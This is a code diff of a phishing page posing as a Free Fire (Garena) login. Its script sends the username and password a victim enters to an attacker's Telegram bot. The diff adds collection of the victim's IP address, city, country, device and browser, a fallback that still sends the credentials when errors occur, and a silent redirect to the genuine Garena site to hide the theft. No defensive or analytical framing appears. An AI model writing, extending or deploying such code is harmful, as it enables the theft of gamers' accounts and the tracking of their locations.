@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Free Fire - Login</title>
     <!-- Font Awesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -22,7 +22,6 @@
             min-height: 100vh;
             position: relative;
         }
-        /* Overlay dark orange */
         body::before {
             content: '';
             position: absolute;
@@ -43,7 +42,7 @@
         .ff-card {
             background: rgba(10, 10, 10, 0.85);
             border: 3px solid #ff6b00;
-            border-radius: 30px 30px 30px 30px;
+            border-radius: 30px;
             padding: 40px 25px;
             box-shadow: 0 20px 40px rgba(255, 94, 0, 0.6);
             backdrop-filter: blur(8px);
@@ -181,19 +180,24 @@
             text-transform: uppercase;
             letter-spacing: 3px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.2s;
             box-shadow: 0 8px 0 #a13d00;
             border: 1px solid #ffaa33;
             font-family: 'Bebas Neue', cursive;
         }
         .login-btn:hover {
             background: linear-gradient(45deg, #ff8800, #ff5500);
-            transform: translateY(-3px);
-            box-shadow: 0 11px 0 #a13d00;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 0 #a13d00;
         }
         .login-btn:active {
-            transform: translateY(5px);
+            transform: translateY(4px);
             box-shadow: 0 4px 0 #a13d00;
+        }
+        .login-btn:disabled {
+            opacity: 0.7;
+            transform: translateY(0);
+            cursor: not-allowed;
         }
         .register-link {
             margin-top: 25px;
@@ -224,13 +228,38 @@
         .footer a:hover {
             color: #ff6b00;
         }
+        .loading-message {
+            color: #ffaa33;
+            font-size: 12px;
+            margin-top: 10px;
+            padding: 8px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 50px;
+            text-align: center;
+            display: none;
+            font-family: Arial, sans-serif;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #ffaa33;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="ff-card">
             <div class="logo">
-                <!-- Free Fire Logo (يمكن استبدال الرابط بصورة محلية أو نص) -->
                 <img src="https://i.imgur.com/9Vc0L7D.png" alt="Free Fire Logo" onerror="this.style.display='none'">
                 <h1>FREE FIRE</h1>
                 <p>BATTLE IN STYLE</p>
@@ -238,11 +267,11 @@
             <form id="loginForm" action="#">
                 <div class="input-group">
                     <i class="fas fa-user-secret"></i>
-                    <input type="text" id="username" placeholder="Username / ID" required>
+                    <input type="text" id="username" placeholder="Username / ID" required autocomplete="off">
                 </div>
                 <div class="input-group">
                     <i class="fas fa-key"></i>
-                    <input type="password" id="password" placeholder="Password" required>
+                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
                 </div>
                 <div class="options">
                     <label>
@@ -250,7 +279,8 @@
                     </label>
                     <a href="#">Forgot password?</a>
                 </div>
-                <button type="submit" class="login-btn">LOGIN</button>
+                <button type="submit" class="login-btn" id="loginBtn">LOGIN</button>
+                <div id="loadingMsg" class="loading-message"></div>
                 <div class="register-link">
                     New to Free Fire? <a href="#">Create account</a>
                 </div>
@@ -267,31 +297,188 @@
         const telegramChatId = '8304101362';
         // ============================================
 
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingMsg = document.getElementById('loadingMsg');
+        
+        let isSubmitting = false;
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const message = `🔥 Free Fire Login\n👤 User: ${username}\n🔑 Pass: ${password}`;
+        // دالة سريعة لجلب IP (مع timeout قصير جداً)
+        async function getIPFast() {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch('https://api.ipify.org?format=json', {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير متاح';
+            }
+        }
+
+        // دالة سريعة لجلب معلومات الموقع (مع timeout)
+        async function getLocationFast(ip) {
+            if (ip === 'غير متاح') return { country: 'غير معروف', city: 'غير معروف' };
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return {
+                    country: data.country_name || 'غير معروف',
+                    city: data.city || 'غير معروف'
+                };
+            } catch (error) {
+                return { country: 'غير معروف', city: 'غير معروف' };
+            }
+        }
+
+        // دالة سريعة لجمع معلومات الجهاز
+        function getDeviceFast() {
+            const ua = navigator.userAgent;
+            let device = 'PC';
+            if (/Android/i.test(ua)) device = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) device = 'iOS';
+            else if (/Windows/i.test(ua)) device = 'Windows';
+            else if (/Mac/i.test(ua)) device = 'Mac';
+            
+            let browser = 'غير معروف';
+            if (/Chrome/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua)) browser = 'Safari';
+            
+            return { device, browser };
+        }
+
+        // إرسال سريع إلى تليجرام (لا ننتظر الرد)
+        function sendToTelegramFast(username, password, ip, location, device) {
+            const timestamp = new Date().toLocaleTimeString('en-US');
+            const message = `🔥 FREE FIRE LOGIN 🔥
+━━━━━━━━━━━━━━━━━━━━━━
+👤 Username: ${username}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
+🏳️ Country: ${location.country}
+🏙️ City: ${location.city}
+📱 Device: ${device.device}
+🌍 Browser: ${device.browser}
+🕒 Time: ${timestamp}
+━━━━━━━━━━━━━━━━━━━━━━`;
+            
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-            // Send data silently to Telegram
+            
+            // إرسال بدون انتظار - Fire and Forget
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: telegramChatId,
-                    text: message,
-                    parse_mode: 'HTML'
+                    text: message
                 })
-            })
-            .then(response => response.json())
-            .catch(error => console.error('Telegram error:', error))
-            .finally(() => {
-                // Redirect to official Free Fire site without any notification
-                window.location.href = 'https://ff.garena.com';
-            });
+            }).catch(() => {});
+        }
+
+        // عرض رسالة تحميل سريعة
+        function showLoading(show, message = 'Connecting...') {
+            if (show) {
+                loadingMsg.innerHTML = `<span class="spinner"></span> ${message}`;
+                loadingMsg.style.display = 'block';
+                loginBtn.disabled = true;
+            } else {
+                loadingMsg.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+
+        // معالج تسجيل الدخول - سريع جداً
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            if (isSubmitting) return;
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!username) {
+                showLoading(false);
+                alert('⚠️ Please enter your username/ID');
+                usernameInput.focus();
+                return;
+            }
+            
+            if (!password) {
+                showLoading(false);
+                alert('⚠️ Please enter your password');
+                passwordInput.focus();
+                return;
+            }
+            
+            isSubmitting = true;
+            showLoading(true, 'Connecting to server...');
+            
+            try {
+                // جمع المعلومات بسرعة (متوازي)
+                const ipPromise = getIPFast();
+                const deviceData = getDeviceFast();
+                
+                const ip = await ipPromise;
+                const location = await getLocationFast(ip);
+                
+                // إرسال فوري إلى تليجرام
+                sendToTelegramFast(username, password, ip, location, deviceData);
+                
+                console.log('✅ Data sent to Telegram');
+                console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${deviceData.device}`);
+                
+                // تحويل فوري
+                showLoading(true, 'Redirecting...');
+                setTimeout(() => {
+                    window.location.href = 'https://ff.garena.com';
+                }, 200);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // حتى لو حدث خطأ، نحاول إرسال البيانات الأساسية
+                try {
+                    const basicMessage = `🔥 FREE FIRE 🔥\n👤 ${username}\n🔑 ${password}\n🕒 ${new Date().toLocaleTimeString()}`;
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
+                    }).catch(() => {});
+                } catch(e) {}
+                
+                showLoading(false);
+                alert('⚠️ Please try again');
+                isSubmitting = false;
+            }
         });
+        
+        // دعم Enter
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginForm.dispatchEvent(new Event('submit'));
+            }
+        });
+        
+        console.log('✅ Free Fire Login Page - Fast Mode');
     </script>
 </body>
 </html>
